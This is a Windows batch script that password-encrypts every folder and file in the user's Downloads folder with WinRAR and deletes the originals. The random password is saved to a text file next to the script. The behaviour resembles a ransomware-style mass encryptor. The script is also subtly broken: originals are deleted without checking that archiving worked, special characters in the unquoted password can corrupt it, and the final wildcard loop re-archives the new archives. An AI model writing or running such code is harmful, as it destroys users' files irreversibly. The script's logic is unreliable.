@echo off
setlocal enabledelayedexpansion

:: Check if password text file already exists
if exist "%~dp0\*.txt" (
    echo Password text file already exists. Exiting.
    pause
    exit /b
)

:: Set paths and variables
set "scriptPath=%~dp0"
set "downloadsFolder=%USERPROFILE%\Downloads"
set "rarPath=C:\Program Files\WinRAR\Rar.exe"

:: Generate a longer and more complex random password
set "specialChars=^!@#$%%^&*()-=_+[]{}|;:',.<>/?"
set "allChars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%specialChars%"
set "password="
for /L %%i in (1,1,20) do (
    set /a "randomIndex=!RANDOM! %% 75"
    for /L %%j in (!randomIndex!,1,!randomIndex!) do (
        set "char=!allChars:~%%j,1!"
        set "password=!password!!char!"
    )
)

:: Get username and current date and time for timestamp
set "username=%USERNAME%"
for /f "delims=" %%b in ('wmic OS Get localdatetime ^| find "."') do set "timestamp=%%b"
set "timestamp=!timestamp:~0,4!-!timestamp:~4,2!-!timestamp:~6,2!_!timestamp:~8,2!!timestamp:~10,2!!timestamp:~12,2!"

:: Create filename based on username and timestamp
set "filename=%username%_%timestamp%.txt"
set "passwordFile=%scriptPath%!filename!"

:: Save username, password, and encryption details to a text file
(
    echo Username: %username%
    echo Password: %password%
    echo Encryption Details:
    echo - Encrypted and compressed folders in the Downloads folder using WinRAR.
    echo - Supported file formats: text, exe, Adobe animate, Adobe photoshop, mp4, mp3, jpeg, and other common formats.
) > "!passwordFile!"

:: Compress and encrypt files and folders in the Downloads folder
cd /d "%downloadsFolder%"
for /d %%i in (*) do (
    if not "%%i"=="." if not "%%i"==".." (
        echo Compressing and encrypting folder: %%i
        "%rarPath%" a -ep1 -p%password% -hp%password% "%%i.rar" "%%i"
        echo Deleting uncompressed folder: %%i
        rmdir /s /q "%%i"
    )
)

for %%i in (*.txt *.exe *.fla *.psd *.mp4 *.mp3 *.jpeg *.jpg *) do (
    echo Compressing and encrypting file: %%i
    "%rarPath%" a -ep1 -p%password% -hp%password% "%%i.rar" "%%i"
    echo Deleting uncompressed file: %%i
    del "%%i"
)

echo All files and folders compressed and encrypted. Information saved to %filename%
pause
